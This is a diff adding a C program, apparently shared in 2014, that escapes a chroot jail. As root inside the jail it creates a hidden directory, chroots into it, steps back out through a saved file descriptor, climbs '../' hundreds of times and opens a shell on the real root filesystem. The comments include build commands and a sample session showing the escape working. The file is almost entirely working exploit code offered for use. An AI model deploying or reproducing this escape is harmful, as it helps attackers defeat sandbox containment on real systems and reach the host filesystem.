@@ -1,0 +1,53 @@
+/// You have been able to break out of chroot jail with this exploit since 1999.
+/// I'm posting this in 2014....
+//////////////////////////////////////////////////////////////////////////////////
+/// This blast from the past brought back to you by: MadMouse
+/// Build it like this:
+///	gcc -static breakout.c -o breakout
+///
+/// Play like this:
+///	root@amnesia:/media/philez/tester# sudo chroot . /bin/sh -l
+///	/ # ls /
+///	bin       breakout  etc       home      lib       lib64     var
+///	/ # ./breakout
+///	root@amnesia:/media/philez/tester# ls /
+///	bin   dev  home        initrd.img.old  live   mnt  proc  run   selinux	sys  usr  vmlinuz
+///	boot  etc  initrd.img  lib	       media  opt  root  sbin  srv	tmp  var  vmlinuz.old
+///	root@amnesia:/media/philez/tester# 
+// ----------------------------------------------------------------------------
+// "THE BEER-WARE LICENSE" (Revision 43):
+// <aaronryool@gmail.com> wrote this file. As long as you retain this notice you
+// can do whatever you want with this stuff. If we meet some day, and you think
+// this stuff is worth it, you can buy me a beer in return Aaron R. Yool
+// ----------------------------------------------------------------------------
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+#define SHELL_PATH "/bin/sh"
+#define SHELL_OPTIONS "-i"
+
+void fuck(void)
+{
+	puts("\nWell man, it looks like I've failed you this time...\n\n"\
+		"Make sure you are running this as root in the chroot.... lol\n\n");
+	exit(-1);	/// exit, we failed....
+}
+
+int main(void)
+{
+	setuid(0);				/// just in case lol
+	int real=open(".",O_RDONLY);		/// lets get the file descriptor
+	chdir("/");				/// go to the root directory... lol
+	mkdir("...  ", 0755);			/// create a special folder so that we can traverse to the real root
+	if(chroot("...  ") == -1) fuck();	/// chroot to our special folder, or exit
+	if (fchdir(real) == -1)	fuck();		/// change the current working directory to reality, or exit
+	close(real);				/// my mom always told me to clean up after myself
+	int i;
+	for(i=0;i<=512;++i)			/// for giggles, do this 512 times just in case
+		if(chroot("../../../../../../") == -1) fuck(); /// find the real root, or exit
+
+	if(access("/...  ", F_OK) != -1) fuck();/// if our special directory exists in the root directory, exit
+	return execl(SHELL_PATH, SHELL_OPTIONS, NULL);	/// on success, give us an outside shell!!!
+}
